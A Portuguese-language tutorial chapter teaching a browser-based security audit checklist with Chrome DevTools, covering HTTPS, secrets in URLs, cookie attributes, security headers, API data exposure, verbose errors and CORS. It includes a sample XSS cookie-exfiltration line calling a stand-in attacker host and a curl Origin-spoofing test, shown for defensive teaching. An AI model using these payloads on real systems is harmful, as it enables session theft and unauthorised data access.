> [⬅️ 5. Headers de Segurança HTTP](./05-headers-de-seguranca.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [8. Glossário Técnico (A–Z) ➡️](./07-glossario-tecnico.md)

---

<a id="s6"></a>
## 6. Como Identificar se uma Aplicação Web é Segura (Checklist de Auditoria no Navegador)

A auditoria de segurança de uma aplicação web começa muito antes do uso de scanners automatizados ou ferramentas de interceptação dedicadas: o próprio navegador moderno, por meio do **Chrome DevTools** (Ferramentas do Desenvolvedor do Google Chrome — veja [Guia Completo do Chrome DevTools](./02a-devtools-network.md#s2)), oferece visibilidade completa sobre a superfície de ataque exposta ao cliente. Toda comunicação **HTTP** (*Hypertext Transfer Protocol* — Protocolo de Transferência de Hipertexto, padronizado na RFC 9110), cada cookie persistido, cada chave gravada no armazenamento local e cada exceção lançada pelo motor JavaScript passam pelas abas **Network** ([Seção 2.1](./02a-devtools-network.md#s2-1)), **Application** ([Seção 2.2](./02b-devtools-application.md#s2-2)) e **Console** ([Seção 2.3](./02c-devtools-console.md#s2-3)).

Do ponto de vista metodológico, a inspeção pelo navegador funciona como uma **análise dinâmica passiva e semiativa do lado do cliente**:

1. **Inspeção passiva**: consiste em navegar pelos fluxos normais da aplicação (página inicial, login, consulta de perfil, checkout, upload de arquivos, logout) enquanto o DevTools registra o tráfego de rede, os artefatos de armazenamento e os logs de execução, sem modificar requisições.
2. **Verificação semiativa (em ambiente autorizado)**: consiste em utilizar filtros, o console **REPL** (*Read-Eval-Print Loop* — laço de leitura, avaliação e impressão) ou a funcionalidade de repetição de requisições (*Replay XHR* / *Copy as fetch*) para validar se controles de segurança (como validação de entrada, **CORS** — *Cross-Origin Resource Sharing* ou Compartilhamento de Recursos de Origem Cruzada — e autorização) são realmente aplicados no servidor ou se existem apenas na interface gráfica.

> [!CAUTION]
> **Ética profissional e legalidade**: qualquer atividade de verificação ativa, manipulação de parâmetros ou teste de intrusão deve ser realizada **exclusivamente** em ambientes para os quais você possua autorização expressa e documentada, ou em laboratórios acadêmicos locais como **OWASP Juice Shop** (*Open Worldwide Application Security Project*), **OWASP WebGoat**, **DVWA** (*Damn Vulnerable Web Application*) e **PortSwigger Web Security Academy**. No Brasil, invadir ou testar dispositivos e sistemas informatizados sem autorização constitui crime previsto no Art. 154-A do Código Penal (incluído pela Lei nº 12.737/2012 e agravado pela Lei nº 14.155/2021).

Para conduzir uma auditoria sistemática e reproduzível — seja em uma prova prática, em uma revisão de qualidade antes do deploy (*pré-produção*) ou em um diagnóstico inicial de segurança — utilize o checklist estruturado nas subseções a seguir. Antes de começar, prepare o navegador:

- **[BOA PRÁTICA]** Abra uma janela anônima (*Incognito*) ou um perfil limpo do Chrome sem extensões de terceiros ativadas, evitando que scripts de extensões (`chrome-extension://`) poluam as abas **Network** e **Console**.
- **[RECOMENDAÇÃO]** Na aba **Network**, marque as caixas **Preserve log** (Preservar registro) e **Disable cache** (Desativar cache) antes de carregar a página. Isso garante que redirecionamentos `301`/`302` durante o login não limpem o histórico de requisições e que o navegador busque todos os cabeçalhos atualizados diretamente do servidor (evitando respostas `304 Not Modified` ou leituras silenciosas do `(disk cache)`).

---

<a id="s6-1"></a>
### 6.1 Auditoria na Aba Network

A aba **Network** ([Seção 2.1](./02a-devtools-network.md#s2-1)) é a fonte primária de verdade sobre o que entra e o que sai do navegador. Nela auditamos a camada de transporte, o endereçamento das requisições, o tráfego de credenciais, os cabeçalhos defensivos, o volume de dados retornado pelas **APIs** (*Application Programming Interfaces* — Interfaces de Programação de Aplicações) e as políticas de origem cruzada.

<a id="s6-1-1"></a>
#### 6.1.1 O site utiliza HTTPS em todas as requisições?

O uso de **HTTPS** (*HTTP over TLS* — HTTP sobre *Transport Layer Security*, cuja versão 1.3 é definida na RFC 8446) é um **[REQUISITO]** inegociável para qualquer aplicação web moderna, especialmente aquelas que transmitem credenciais, tokens de sessão ou **PII** (*Personally Identifiable Information* — Informações Pessoais Identificáveis). Mesmo uma única sub-requisição em texto claro (`http://`) dentro de uma página carregada via `https://` configura **Mixed Content** (Conteúdo Misto), expondo o usuário a interceptação na rede (**MITM** — *Man-in-the-Middle* ou Ataque de Intermediário).

##### Como verificar passo a passo

1. Abra o Chrome DevTools (`F12` ou `Ctrl+Shift+I`), selecione a aba **Network** e ative **Preserve log** e **Disable cache**.
2. Clique com o botão direito sobre o cabeçalho da tabela de requisições (onde aparecem `Name`, `Status`, `Type`) e habilite as colunas **Scheme** (Esquema) e **Protocol** (Protocolo).
3. Navegue pelo fluxo completo da aplicação (incluindo carregamento inicial, login, carregamento de imagens/scripts e chamadas de API).
4. Na caixa de filtro (*Filter*), digite `scheme:http` para listar imediatamente qualquer requisição que não utilize criptografia TLS.
5. Verifique também conexões **WebSocket**: filtre pelo botão **WS** (ou digite `scheme:ws`) para garantir que todas utilizem o esquema criptografado `wss://` em vez de `ws://`.
6. Caso o usuário digite inicialmente `http://loja-ficticia.test` na barra de endereços, observe a primeira requisição da lista para confirmar se o servidor responde com redirecionamento permanente (`301 Moved Permanently` ou `308 Permanent Redirect`) para `https://` e se a diretiva `upgrade-insecure-requests` ou o cabeçalho **HSTS** (*HTTP Strict Transport Security* — RFC 6797) está presente.

##### Resultado esperado (seguro)

- **[REQUISITO]** Todas as requisições exibem `https` (ou `wss` para WebSockets) na coluna **Scheme**; a busca por `scheme:http` ou `scheme:ws` retorna zero resultados (exceto um eventual redirecionamento inicial `301`/`308` de `http://` para `https://` sem tráfego de credenciais ou cookies de sessão).
- **[RECOMENDAÇÃO]** A coluna **Protocol** exibe versões modernas como `h2` (HTTP/2 — RFC 9113) ou `h3` (HTTP/3 sobre **QUIC** — RFC 9114 / RFC 9000), que operam obrigatoriamente sobre TLS nos navegadores.
- **[BOA PRÁTICA]** Respostas `307 Internal Redirect` com cabeçalho `Non-Authoritative-Reason: HSTS` demonstram que o próprio navegador já forçou a conversão interna de `http://` para `https://` antes mesmo de enviar pacotes à rede.

##### Sinais de alerta (inseguro)

- Presença de requisições com `Scheme: http` transportando formulários de login, tokens `Authorization: Bearer ...` ou cookies de sessão.
- Recursos estáticos (imagens, folhas de estilo **CSS** — *Cascading Style Sheets* — ou arquivos JavaScript) carregados via `http://` dentro de um documento `https://`, gerando avisos ou bloqueios de *Mixed Content* na coluna **Status** (`(blocked:mixed-content)`).
- Formulários HTML em páginas `https://` cujo atributo `action` aponta para `http://api.loja-ficticia.test/login` (submissão insegura de formulário).
- Redirecionamento inicial de `http://` para `https://` que já define um cookie de sessão (`Set-Cookie`) na resposta HTTP em texto claro antes de concluir o upgrade para TLS.

##### Exemplo prático

Ao filtrar por `scheme:http` na aba **Network** durante uma auditoria no laboratório `loja-ficticia.test`, o auditor encontra duas falhas críticas:

```text
Name                     Status                   Scheme   Protocol   Type        Initiator
----------------------------------------------------------------------------------------------------
login                    200 OK                   http     http/1.1   fetch       auth.js:42
tracker.js               (blocked:mixed-content)  http     -          script      index.html:18
```

Inspecionando a requisição `login` na sub-aba **Headers**, observa-se:

```http
POST /api/v1/login HTTP/1.1
Host: api.loja-ficticia.test
Content-Type: application/json

{"email": "aluno@exemplo.test", "senha": " MinhaSenhaForte!123 "}
```

**Diagnóstico**: A página principal estava em `https://loja-ficticia.test`, mas o código em `auth.js` tinha a URL da API fixada com `http://`. A senha trafegou em texto puro pela rede local. A correção exige alterar a URL da API para `https://api.loja-ficticia.test`, ativar HSTS (`Strict-Transport-Security: max-age=31536000; includeSubDomains`) e incluir `Content-Security-Policy: upgrade-insecure-requests`.

---

<a id="s6-1-2"></a>
#### 6.1.2 Existem dados sensíveis nas URLs (query strings e paths)?

A **URL** (*Uniform Resource Locator* — Localizador Uniforme de Recursos) **não é um canal confidencial**, mesmo quando transmitida sobre HTTPS. Embora o caminho (*path*) e a *query string* (parâmetros após `?`) sejam criptografados em trânsito pelo TLS entre o cliente e o servidor, a URL completa fica exposta em múltiplos locais fora do túnel criptográfico: histórico local do navegador, logs de acesso de servidores web (Nginx, Apache), logs de proxies reversos e **CDNs** (*Content Delivery Networks* — Redes de Distribuição de Conteúdo), sistemas de monitoramento (**APM** — *Application Performance Monitoring*) e, caso não haja uma `Referrer-Policy` restritiva, no cabeçalho `Referer` enviado a sites de terceiros.

##### Como verificar passo a passo

1. Na aba **Network**, clique com o botão direito no cabeçalho das colunas e ative **Path** ou **URL** (além de **Method**).
2. Execute operações que manipulam credenciais ou dados pessoais: login, redefinição de senha, busca de clientes por **CPF** (Cadastro de Pessoas Físicas), visualização de faturas e chamadas autenticadas.
3. Use a barra de busca global da aba Network (`Ctrl+F` ou ícone de lupa — diferente da caixa de filtro simples) e pesquise por palavras-chave sensíveis: `password`, `senha`, `token`, `jwt`, `key`, `secret`, `cpf`, `ssn`, `card`, `cvv`, `session`, `auth`.
4. Filtre por `method:GET` na caixa de filtro e examine a sub-aba **Payload** -> **Query String Parameters** das requisições listadas.
5. Inspecione requisições para domínios de terceiros (use o checkbox **3rd-party requests** `[Varia por versão]` ou o filtro `-domain:*.loja-ficticia.test`) e verifique na sub-aba **Headers** -> **Request Headers** se o cabeçalho `Referer` está vazando URLs internas contendo tokens de recuperação de senha ou identificadores sensíveis.

##### Resultado esperado (seguro)

- **[REQUISITO]** Senhas, números de cartão de crédito, códigos de segurança, tokens de sessão (`session_id`, **JWT** — *JSON Web Token*, RFC 7519) e chaves de API (`api_key`) **nunca** aparecem na URL; são transmitidos exclusivamente no corpo (*Request Payload*) de requisições `POST`/`PUT`/`PATCH` ou em cabeçalhos HTTP dedicados (`Authorization`, `Cookie`).
- **[RECOMENDAÇÃO]** Fluxos de recuperação de senha ou *magic links* que inevitavelmente trazem um token de uso único na URL consomem esse token imediatamente no primeiro carregamento, limpam a URL via `history.replaceState()` e utilizam `Referrer-Policy: no-referrer` (ou `strict-origin-when-cross-origin`) para impedir seu vazamento via `Referer`.

##### Sinais de alerta (inseguro)

- Requisições `GET /api/login?user=maria&pass=123456` (credenciais em query string).
- Tokens de sessão ou JWT passados na URL: `GET /relatorios/exportar?access_token=eyJhbGciOi...`.
- Dados pessoais sensíveis diretamente no path ou query string: `GET /api/pacientes?cpf=123.456.789-00&diagnostico=cid10`.
- Requisição para um script analítico externo (`https://analytics.terceiro.test/collect`) contendo `Referer: https://loja-ficticia.test/reset-password?reset_token=9f8e7d6c5b4a`.

##### Exemplo prático

Ao clicar em " Baixar Extrato PDF " em uma aplicação bancária de laboratório, a aba **Network** exibe:

```http
GET /api/v2/extratos/download?cpf=11122233344&jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... HTTP/2
Host: ibank.exemplo.test
Referer: https://ibank.exemplo.test/painel?cpf=11122233344
```

E, na sub-aba **Payload** -> **Query String Parameters**:

```text
cpf: 11122233344
jwt: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Diagnóstico**: Tanto o CPF quanto o JWT de autenticação ficaram gravados em texto claro nos arquivos `access.log` do proxy reverso e no histórico do navegador do usuário. A correção exige enviar o JWT em um cookie `HttpOnly` ou no cabeçalho `Authorization: Bearer <token>`, e inferir o CPF do usuário autenticado a partir da sessão no servidor (ou enviá-lo no corpo de um `POST`).

---

<a id="s6-1-3"></a>
#### 6.1.3 Os cookies enviados e recebidos possuem atributos adequados?

Cookies HTTP (padronizados na RFC 6265 e atualizados pela especificação RFC 6265bis) continuam sendo o mecanismo predominante para gerenciamento de estado e sessões na web. Um cookie de sessão emitido sem as flags de proteção corretas fica vulnerável a roubo via **XSS** (*Cross-Site Scripting*), interceptação em rede sem criptografia ou envio forçado em ataques de **CSRF** (*Cross-Site Request Forgery* — Falsificação de Requisição entre Sites; veja [Seção 3.3](./03a-vulnerabilidades-parte1.md#s3)).

##### Como verificar passo a passo

1. Na aba **Network**, use o filtro `has-response-header:set-cookie` para isolar todas as respostas do servidor que criam ou atualizam cookies (especialmente a resposta do endpoint de login).
2. Clique também com o botão direito nas colunas da tabela de requisições e habilite **Cookies** (quantidade de cookies enviados) e **Set Cookies** (quantidade de cookies recebidos).
3. Selecione a requisição de autenticação e examine:
   - Na sub-aba **Headers** -> **Response Headers**: leia a linha bruta do cabeçalho `Set-Cookie`.
   - Na sub-aba **Cookies** (dentro do painel de detalhes da requisição): veja a tabela estruturada de **Request Cookies** e **Response Cookies**, que decompõe visualmente os atributos `Value`, `Domain`, `Path`, `Expires / Max-Age`, `Size`, `HttpOnly`, `Secure` e `SameSite`.
4. Marque o checkbox **Blocked response cookies** na barra de filtros da aba Network para identificar cookies que o servidor tentou definir, mas que foram rejeitados pelo navegador (sinalizados com um ícone de alerta amarelo ao lado da linha `Set-Cookie`).

##### Resultado esperado (seguro)

- **[REQUISITO]** Todo cookie de sessão, autenticação ou proteção CSRF sensível inclui obrigatoriamente:
  - `Secure`: garante transmissão exclusiva sobre HTTPS.
  - `HttpOnly`: impede que scripts no navegador leiam o cookie via `document.cookie` (exceto quando o cookie é especificamente um token *Double Submit Cookie* de CSRF que precisa ser lido pelo JavaScript da própria origem para preencher o header `X-CSRF-Token`).
  - `SameSite=Lax` ou `SameSite=Strict`: controla o envio do cookie em requisições *cross-site* (entre sites diferentes), mitigando CSRF.
- **[BOA PRÁTICA]** Uso dos prefixos de nomenclatura `__Host-` (exige `Secure`, `Path=/` e ausência de `Domain`, blindando contra *cookie tossing* por subdomínios) ou `__Secure-` (exige `Secure`).
- **[RECOMENDAÇÃO]** Expiração (`Max-Age` ou `Expires`) compatível com a criticidade da sessão, sem validades de múltiplos anos para sessões autenticadas.

##### Sinais de alerta (inseguro)

- Cabeçalho `Set-Cookie: session_id=abc123xyz; Path=/` sem `HttpOnly`, sem `Secure` e sem `SameSite` explícito.
- Uso de `SameSite=None; Secure` em cookies de sessão principais sem que haja necessidade arquitetural real de embutir a aplicação em um `<iframe>` de terceiro.
- Atributo `Domain=.exemplo.test` amplo demais em um cookie de administração, permitindo que qualquer subdomínio vulnerável (`blog-legado.exemplo.test`) receba ou sobrescreva o cookie da aplicação principal (`admin.exemplo.test`).
- Aviso de cookie bloqueado no DevTools: `This Set-Cookie header didn't specify a "SameSite" attribute and was defaulted to "SameSite=Lax"...` ou `This attempt to set a cookie via a Set-Cookie header was blocked because it had the "SameSite=None" attribute but did not have the "Secure" attribute`.

##### Exemplo prático

Comparando duas respostas de login capturadas na aba **Headers** -> **Response Headers**:

```http
# INSEGURO — Capturado em versão vulnerável de laboratório:
Set-Cookie: PHPSESSID=8f3a9b1c2d4e5f6a7b8c9d0e; path=/; domain=.loja-ficticia.test

# SEGURO — Após correção e hardening:
Set-Cookie: __Host-sid=8f3a9b1c2d4e5f6a7b8c9d0e1f2a3b4c; Path=/; Max-Age=3600; Secure; HttpOnly; SameSite=Lax
```

**Diagnóstico**: No primeiro caso, o cookie `PHPSESSID` pode ser roubado por `fetch('https://atacante.test/?c=' + document.cookie)` caso exista um XSS, pode vazar em chamadas HTTP e é enviado para todos os subdomínios de `loja-ficticia.test`. No segundo caso, o prefixo `__Host-` aliado a `Secure`, `HttpOnly` e `SameSite=Lax` isola o cookie na origem exata, protege contra leitura via JavaScript e restringe o envio *cross-site*.

---

<a id="s6-1-4"></a>
#### 6.1.4 Existem headers de segurança nas respostas?

Os cabeçalhos HTTP de segurança (estudados detalhadamente na [Seção 5](./05-headers-de-seguranca.md#s5)) instruem o navegador a ativar mecanismos de defesa em profundidade contra injeção de scripts, *clickjacking*, *MIME sniffing*, vazamento de URLs de referência e isolamento de contexto.

> [!IMPORTANT]
> Nem todo header de segurança se aplica a todo tipo de resposta. Durante a auditoria na aba **Network**, avalie os headers **de acordo com o tipo de recurso**: diretivas de renderização como `Content-Security-Policy` (com `script-src`, `style-src`), `X-Frame-Options` e `Permissions-Policy` são fundamentais em **documentos HTML** (filtro **Doc**), enquanto respostas de **APIs JSON** (filtro **Fetch/XHR**) exigem principalmente `Content-Type: application/json`, `X-Content-Type-Options: nosniff`, `Cache-Control: no-store` (quando contêm dados privados), `Strict-Transport-Security` e `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`.

##### Como verificar passo a passo

1. Na aba **Network**, clique no filtro **Doc** para exibir apenas os documentos HTML principais (e documentos de `<iframe>`).
2. Selecione a requisição principal do documento (`200 OK`) e abra a sub-aba **Headers** -> **Response Headers**.
3. Dica de produtividade no DevTools: clique com o botão direito no cabeçalho das colunas da tabela de requisições -> **Response Headers** -> **Manage Header Columns...** (Gerenciar colunas de cabeçalho) e adicione colunas personalizadas para `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy` e `Cache-Control`. Assim, você visualiza a presença ou ausência de todos eles simultaneamente para dezenas de requisições.
4. Repita a verificação mudando para o filtro **Fetch/XHR** e inspecionando respostas de endpoints autenticados.

##### Resultado esperado (seguro)

- **[REQUISITO]** Em todas as respostas HTTPS: `Strict-Transport-Security: max-age=31536000; includeSubDomains` e `X-Content-Type-Options: nosniff`.
- **[REQUISITO]** Em documentos HTML e fluxos autenticados sujeitos a *clickjacking*: `Content-Security-Policy` contendo `frame-ancestors 'none'` (ou `'self'`) acompanhado de `X-Frame-Options: DENY` (ou `SAMEORIGIN`) para compatibilidade.
- **[RECOMENDAÇÃO]** Em documentos HTML: `Content-Security-Policy` bem definida (sem `'unsafe-inline'` e sem `'unsafe-eval'` em `script-src`), `Referrer-Policy: strict-origin-when-cross-origin` (ou `no-referrer`), `Permissions-Policy` restringindo APIs de hardware não utilizadas (`camera=()`, `microphone=()`, `geolocation=()`), e `Cross-Origin-Opener-Policy: same-origin` (ou `same-origin-allow-popups`).
- **[REQUISITO]** Em respostas com dados pessoais ou financeiros autenticados: `Cache-Control: no-store, no-cache, must-revalidate, private`.

##### Sinais de alerta (inseguro)

- Ausência total de `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options` e `X-Content-Type-Options` no documento HTML principal.
- Presença de uma **CSP** (*Content Security Policy* — Política de Segurança de Conteúdo) meramente decorativa que anula sua própria proteção, como `Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'`.
- `Strict-Transport-Security: max-age=0` (que instrui o navegador a **apagar** a política HSTS) ou `max-age` excessivamente curto em produção.
- Respostas de APIs autenticadas (`/api/v1/meu-perfil`) retornando `Cache-Control: public, max-age=3600`, permitindo que CDNs ou proxies compartilhados armazenem dados de um usuário e os entreguem a outro (*Web Cache Poisoning* / *Cache Deception*).

##### Exemplo prático

Ao auditar o documento `GET https://painel.loja-ficticia.test/dashboard` na sub-aba **Response Headers**, o auditor compara:

```http
# RESPOSTA VULNERÁVEL (Sem defesas no navegador):
HTTP/2 200 OK
content-type: text/html; charset=UTF-8
server: Apache/2.4.29 (Ubuntu)
x-powered-by: PHP/7.2.24
cache-control: public, max-age=600

# RESPOSTA SEGURA (Com headers defensivos apropriados):
HTTP/2 200 OK
content-type: text/html; charset=UTF-8
strict-transport-security: max-age=63072000; includeSubDomains; preload
content-security-policy: default-src 'self'; script-src 'self' 'nonce-rAnd0mN0nc3Base64=='; style-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
x-content-type-options: nosniff
x-frame-options: DENY
referrer-policy: strict-origin-when-cross-origin
permissions-policy: camera=(), microphone=(), geolocation=(), payment=()
cross-origin-opener-policy: same-origin
cache-control: no-store, private
```

---

<a id="s6-1-5"></a>
#### 6.1.5 As APIs retornam somente os dados estritamente necessários?

Muitas aplicações modernas (especialmente **SPAs** — *Single-Page Applications* ou Aplicações de Página Única — construídas em React, Vue ou Angular) buscam objetos JSON completos de uma API REST e filtram no próprio JavaScript apenas os 2 ou 3 campos que serão exibidos na tela. Como o usuário (ou um atacante) tem acesso integral ao tráfego bruto na aba **Network**, qualquer campo extra enviado no JSON já foi exposto — vulnerabilidade classificada pela OWASP API Security como **Excessive Data Exposure** (Exposição Excessiva de Dados, parte de *Broken Object Property Level Authorization* — BOPLA).

##### Como verificar passo a passo

1. Na aba **Network**, selecione o filtro **Fetch/XHR** para focar exclusivamente nas chamadas assíncronas de API.
2. Navegue por páginas que exibem dados parciais de terceiros ou do próprio usuário: lista de comentários de um produto, ranking de usuários, busca de colegas de equipe, página de perfil público.
3. Clique em cada requisição `GET` ou `POST` que retorna JSON e abra as sub-abas **Preview** (visualização em árvore interativa) e **Response** (texto JSON bruto).
4. Compare os atributos presentes na árvore JSON da aba **Preview** com o que está efetivamente renderizado na interface gráfica da página (**DOM** — *Document Object Model* ou Modelo de Objetos do Documento).
5. Use `Ctrl+F` dentro da sub-aba **Response** para buscar campos que jamais deveriam sair do servidor: `password`, `hash`, `salt`, `cpf`, `rg`, `telefone`, `endereco`, `isAdmin`, `role`, `internal_notes`, `stripe_secret`, `balance`.

##### Resultado esperado (seguro)

- **[REQUISITO]** A resposta JSON contém **exclusivamente** os campos necessários para a funcionalidade daquela tela específica (implementação no servidor via **DTOs** — *Data Transfer Objects* ou Objetos de Transferência de Dados — ou projeções explícitas `SELECT id, nome_exibicao, avatar_url` no banco de dados).
- **[REQUISITO]** Hashes de senha, salts criptográficos, tokens de redefinição e segredos de servidor nunca são serializados em respostas de API, sob nenhuma circunstância.

##### Sinais de alerta (inseguro)

- Um endpoint de comentários públicos (`GET /api/produtos/50/avaliacoes`) que, na tela, mostra apenas "João S. — Ótimo produto!", mas na aba **Preview** do DevTools retorna o objeto `autor` completo serializado diretamente do **ORM** (*Object-Relational Mapping* — Mapeamento Objeto-Relacional), incluindo `email`, `cpf`, `password_hash`, `endereco_entrega` e `role: "customer"`.
- Endpoints de listagem retornando dezenas de registros de outros clientes que foram ocultados apenas visualmente com `Array.prototype.filter()` no front-end.

##### Exemplo prático

Na tela de um fórum acadêmico, cada postagem mostra apenas o apelido do autor (`@mariasilva`). Porém, ao inspecionar `GET /api/v1/posts/104` na sub-aba **Preview** da aba **Network**, o estudante encontra:

```json
{
  "postId": 104,
  "titulo": "Dúvida sobre sub-redes CIDR",
  "conteudo": "Como calcular o endereço de broadcast de um /26?",
  "autor": {
    "id": 8821,
    "username": "mariasilva",
    "nomeCompleto": "Maria da Silva Oliveira",
    "cpf": "123.456.789-00",
    "email": "maria.silva@universidade.edu.br",
    "telefone": "+5511999998888",
    "passwordHash": "$2b$12$K8H9s7d6f5g4h3j2k1l0m.u7y6t5r4e3w2q1a0s9d8f7g6h5j4k3l",
    "resetPasswordToken": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    "isAdmin": false
  }
}
```

**Diagnóstico**: O desenvolvedor back-end executou `return res.json(post)` com `include: { autor: true }` no ORM sem selecionar os campos permitidos. Qualquer visitante pode não apenas colher o CPF, e-mail e telefone de todos os autores do fórum, como também usar o `resetPasswordToken` exposto para sequestrar a conta de `@mariasilva` imediatamente.

---

<a id="s6-1-6"></a>
#### 6.1.6 Existem respostas com informações internas do servidor ou banco?

Mensagens de erro detalhadas, cabeçalhos de identificação de tecnologia (*banners*) e arquivos de mapeamento de código-fonte são excelentes durante o desenvolvimento local, mas em produção funcionam como um mapa completo da infraestrutura para um atacante. Essa falha enquadra-se em **Security Misconfiguration** (Configuração Incorreta de Segurança — OWASP A05:2021 / A02:2025; veja [Seção 3.7](./03a-vulnerabilidades-parte1.md#s3)).

##### Como verificar passo a passo

1. Na aba **Network**, filtre por códigos de erro do cliente e do servidor usando `status-code:400`, `status-code:404`, `status-code:422`, `status-code:500`, `status-code:502` ou digite `-status-code:200` para destacar comportamentos anômalos.
2. Clique em qualquer resposta HTTP e verifique na sub-aba **Headers** -> **Response Headers** os cabeçalhos de identificação: `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-AspNetMvc-Version`, `X-Generator`, `Via` e `X-Backend-Server`.
3. Para respostas `4xx` e `5xx`, abra as sub-abas **Preview** e **Response** para verificar se o corpo contém *stack traces* (rastreamentos de pilha de execução), nomes de tabelas e colunas SQL, caminhos absolutos do sistema de arquivos (`/var/www/html/...` ou `C:\inetpub\wwwroot\...`) ou variáveis de ambiente despejadas por páginas de debug (como Django Debug Mode, Laravel Ignition/Whoops ou Express error handler padrão).
4. Filtre por arquivos JavaScript (**JS**) e verifique nas últimas linhas da sub-aba **Response** (ou na lista de requisições) se arquivos **Source Maps** (`.js.map` ou `.css.map`) estão publicamente acessíveis, o que permite reconstruir todo o código-fonte original (TypeScript/React) com comentários internos na aba **Sources**.

##### Resultado esperado (seguro)

- **[REQUISITO]** Erros `500 Internal Server Error` ou `400 Bad Request` retornam mensagens genéricas e padronizadas para o cliente, acompanhadas apenas de um identificador de correlação (`traceId` / `correlationId`), enquanto os detalhes técnicos e o *stack trace* são gravados exclusivamente nos logs internos do servidor.
- **[RECOMENDAÇÃO]** Cabeçalhos `X-Powered-By` e `X-AspNet-Version` removidos; cabeçalho `Server` omitido ou reduzido ao nome genérico sem versão exata do pacote e do sistema operacional (ex.: `Server: nginx` em vez de `Server: nginx/1.18.0 (Ubuntu)`).
- **[BOA PRÁTICA]** Arquivos `.map` (*Source Maps*) bloqueados para o público externo em produção (restritos à VPN de engenharia ou enviados diretamente à ferramenta de monitoramento de erros no pipeline de CI/CD — *Continuous Integration / Continuous Delivery*).

##### Sinais de alerta (inseguro)

- Cabeçalhos expondo versões exatas e vulneráveis: `Server: Apache/2.4.49 (Unix) OpenSSL/1.1.1k` ou `X-Powered-By: Express` / `PHP/5.6.40`.
- Corpo de resposta `500` exibindo `PDOException: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'db_producao.tb_usuarios_admin' doesn't exist in /var/www/app/src/Repository/UserRepo.php:84`.
- Cabeçalho `X-Upstream-Addr: 10.240.12.88:8080` revelando o endereço IP privado RFC 1918 do servidor de aplicação por trás do proxy reverso.

##### Exemplo prático

Ao enviar um formato de data inválido em uma busca de pedidos, a aba **Network** registra uma resposta `500 Internal Server Error` cujo painel **Response** exibe:

```json
{
  "status": 500,
  "error": "Internal Server Error",
  "exception": "org.postgresql.util.PSQLException: ERROR: invalid input syntax for type date: \"2026-99-99\"",
  "query": "SELECT p.id, p.valor_total, u.cpf FROM pedidos p JOIN usuarios u ON p.usuario_id = u.id WHERE p.criado_em >= '2026-99-99'",
  "stack": "at com.lojaficticia.dao.PedidoDAO.buscarPorData(PedidoDAO.java:112)\n\tat com.lojaficticia.controller.PedidoController.listar(PedidoController.java:45)",
  "dbHost": "10.0.4.15:5432"
}
```

**Diagnóstico**: O erro revelou o banco de dados (PostgreSQL na porta `5432`), o IP interno do banco (`10.0.4.15`), a linguagem e pacotes do back-end (Java), a estrutura exata das tabelas (`pedidos`, `usuarios`) e, pior, confirmou que o parâmetro de data está sendo **concatenado diretamente na string SQL** (`WHERE p.criado_em >= '2026-99-99'`), evidenciando uma vulnerabilidade crítica de **SQL Injection** (veja [Seção 3.1](./03a-vulnerabilidades-parte1.md#s3)).

---

<a id="s6-1-7"></a>
#### 6.1.7 Há problemas ou permissividade excessiva de CORS?

A **SOP** (*Same-Origin Policy* — Política de Mesma Origem) é a fronteira fundamental de isolamento da web: por padrão, um script executado em `https://site-malicioso.test` não consegue ler respostas de `https://api.loja-ficticia.test`. O **CORS** ([Seção 1.11](./01a-fundamentos-web-parte1.md#s1) e [Seções 5.10/5.11](./05-headers-de-seguranca.md#s5)) flexibiliza essa regra por meio de cabeçalhos HTTP. Quando configurado de maneira permissiva demais, o CORS destrói o isolamento da SOP e permite que qualquer site na internet leia dados confidenciais do usuário autenticado.

##### Como verificar passo a passo

1. Na aba **Network**, filtre por `has-response-header:access-control-allow-origin` para listar todas as respostas que emitem políticas CORS.
2. Verifique também se há requisições de *preflight* filtrando por `method:OPTIONS`.
3. Selecione endpoints autenticados (que retornam dados do usuário ou aceitam comandos em seu nome) e examine na sub-aba **Headers** -> **Response Headers** os cabeçalhos:
   - `Access-Control-Allow-Origin` (**ACAO**)
   - `Access-Control-Allow-Credentials` (**ACAC**)
   - `Access-Control-Allow-Methods`
   - `Vary`
4. Em ambiente de laboratório autorizado, para verificar se o servidor sofre de **reflexão cega de `Origin`**, clique com o botão direito na requisição de API -> **Copy** -> **Copy as cURL (bash)** e execute no terminal alterando o cabeçalho `-H 'Origin: https://atacante.exemplo.test'` (ou `-H 'Origin: null'`), observando se o servidor devolve `Access-Control-Allow-Origin: https://atacante.exemplo.test` combinado com `Access-Control-Allow-Credentials: true`.

##### Resultado esperado (seguro)

- **[REQUISITO]** Endpoints que utilizam cookies ou credenciais (`Access-Control-Allow-Credentials: true`) validam o cabeçalho `Origin` recebido contra uma **lista de permissões estrita** (*allowlist*) de domínios confiáveis (ex.: `https://app.loja-ficticia.test`) e incluem `Vary: Origin` na resposta para evitar envenenamento de cache HTTP.
- **[RECOMENDAÇÃO]** O curinga `Access-Control-Allow-Origin: *` é utilizado **exclusivamente** para recursos 100% públicos e anônimos (fontes tipográficas, bibliotecas estáticas, dados abertos sem autenticação).

##### Sinais de alerta (inseguro)

- **Combinação crítica**: o servidor reflete qualquer valor enviado no cabeçalho `Origin` da requisição dentro de `Access-Control-Allow-Origin` **e** envia `Access-Control-Allow-Credentials: true`. Isso permite que qualquer página web visitada pela vítima faça um `fetch('https://api.loja-ficticia.test/perfil', { credentials: 'include' })` e leia todos os seus dados privados.
- Aceitação da origem `Access-Control-Allow-Origin: null` combinada com `Access-Control-Allow-Credentials: true` (explorável via `<iframe>` com atributo `sandbox`).
- Validação de origem por expressão regular falha que aceita `https://loja-ficticia.test.atacante.com` ou `https://malicioso-loja-ficticia.test`.
- Ausência de `Vary: Origin` quando o servidor retorna valores dinâmicos em `Access-Control-Allow-Origin`.

##### Exemplo prático

Inspecionando uma requisição `GET https://api.loja-ficticia.test/v1/carteira/saldo` na aba **Network**:

```http
# Request Headers
GET /v1/carteira/saldo HTTP/2
Host: api.loja-ficticia.test
Origin: https://parceiro-nao-confiavel.test
